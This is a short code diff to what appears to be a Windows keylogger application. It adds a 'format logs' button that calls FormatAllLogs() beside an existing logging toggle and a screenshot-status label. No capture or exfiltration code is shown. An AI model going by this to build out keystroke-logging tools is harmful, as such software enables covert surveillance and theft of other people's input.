@@ -11,6 +11,7 @@
 #include <gdiplus.h>
 #include "TrayIconManager.h"
 #include "CleanupManager.h"
+#include "LogFormatter.h"
 #pragma comment(lib, "Gdiplus.lib")
 
 #define APP_MUTEX_NAME L"KeyloggerAppMutex"
@@ -154,6 +155,10 @@ INT_PTR CALLBACK DialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lPara
             SetDlgItemText(hDlg, IDC_SS_STATUS_LABEL, L"");
             break;
         }
+        case IDC_FORMAT_LOGS_BTN:
+            FormatAllLogs();
+            SetDlgItemText(hDlg, IDC_FORMAT_LOGS_STATUS_LABEL, L"Logs formatted.");
+            break;
         case IDC_LOG_BTN:
             keylogger.setLogging(!keylogger.isLogging());
             UpdateStatus(hDlg);
